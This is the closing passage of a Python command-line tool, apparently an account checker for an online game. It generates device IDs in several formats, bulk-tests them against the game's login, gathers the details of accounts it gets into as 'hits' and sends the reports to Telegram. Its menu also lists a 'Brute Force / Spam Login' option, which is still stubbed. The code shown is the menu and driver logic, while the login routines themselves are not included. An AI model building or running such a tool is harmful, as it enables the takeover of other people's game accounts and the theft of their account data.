            ("F1 Classic", format_1_classic()),
            ("F2 ExtB36", format_2_extended_b36()),
            ("F3 Android", format_3_android_style()),
            ("F4 GAID", format_4_gaid()),
            ("F5 iOS", format_5_ios_simple()),
            ("F6 iOS+TS", format_6_ios_timestamp()),
            ("F7 Composite", format_7_composite()),
            ("F8 UUID5", format_8_uuid5_style()),
        ]
        for name, dev in samples:
            print(f"  {Fore.CYAN}{name:<12}{Style.RESET_ALL} {Fore.LIGHTBLACK_EX}{dev}{Style.RESET_ALL}")
        print()

    size = input(f"{Fore.CYAN}Size in MB (default 10): {Style.RESET_ALL}").strip()
    size = float(size) if size else 10.0
    threads = input(f"{Fore.CYAN}Threads (default 16): {Style.RESET_ALL}").strip()
    threads = int(threads) if threads.isdigit() else 16

    run_generator(size, threads)
    input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")

# ────────────────────────────────────────────────────────────────
# 15. SINGLE CHECK
# ────────────────────────────────────────────────────────────────

def run_single_check():
    print_header("🔍 SINGLE ACCOUNT CHECK")
    device_id = input(f"{Fore.YELLOW}➡️ Enter Device ID: {Style.RESET_ALL}").strip()
    if not device_id: return

    print(f"\n{Fore.CYAN}[*] Checking...{Style.RESET_ALL}")

    acc, zone, stat = GameLogin(device_id).run()
    if not acc or not zone:
        print(f"{Fore.RED}❌ Login failed: {stat}{Style.RESET_ALL}")
        input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
        return

    print(f"{Fore.GREEN}✓ Login OK: {acc} ({zone}){Style.RESET_ALL}")

    with HIT_LIST_LOCK:
        HIT_LIST.clear()

    success = process_detail(device_id, acc, zone)

    if success:
        print(f"{Fore.GREEN}✓ Full detail collected{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  Menu [8] to send to Telegram{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}✗ Detail check failed{Style.RESET_ALL}")

    input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")

def run_bruteforce_login():
    print_header("⚡ BRUTE FORCE")
    print(f"{Fore.LIGHTBLACK_EX}Coming soon{Style.RESET_ALL}")
    input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")

# ────────────────────────────────────────────────────────────────
# 16. MAIN MENU
# ────────────────────────────────────────────────────────────────

def main():
    ensure_dirs()
    while True:
        print_header("🔥 PREMIUM DEVID SEKER 🔥")
        print(f"{Fore.YELLOW}[1]{Style.RESET_ALL} Generate Device IDs (OEM A/B/C/D)")
        print(f"{Fore.YELLOW}[2]{Style.RESET_ALL} Premium Bulk Check (LIVE)")
        print(f"{Fore.YELLOW}[3]{Style.RESET_ALL} Show Statistics")
        print(f"{Fore.YELLOW}[4]{Style.RESET_ALL} Clean Output Files")
        print(f"{Fore.YELLOW}[5]{Style.RESET_ALL} Test Telegram")
        print(f"{Fore.YELLOW}[6]{Style.RESET_ALL} ⚡ Brute Force / Spam Login")
        print(f"{Fore.YELLOW}[7]{Style.RESET_ALL} 🔍 Single Account Check")
        print(f"{Fore.YELLOW}[8]{Style.RESET_ALL} 📄 Send Hit Report (TG TXT)")
        print(f"{Fore.YELLOW}[0]{Style.RESET_ALL} Exit\n")

        choice = input(f"{Fore.CYAN}Choose (0-8): {Style.RESET_ALL}").strip()

        if choice == '0':
            print(f"\n{Fore.GREEN}Goodbye! — {ADMIN_USERNAME_DISPLAY}{Style.RESET_ALL}")
            break
        elif choice == '1': run_generator_menu()
        elif choice == '2': run_bulk_detail()
        elif choice == '3': show_stats()
        elif choice == '4': run_cleanup()
        elif choice == '5': test_telegram()
        elif choice == '6': run_bruteforce_login()
        elif choice == '7': run_single_check()
        elif choice == '8': send_hits_report_to_tg()
        else: print(f"{Fore.RED}Invalid.{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}Stopped.{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}Error: {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()
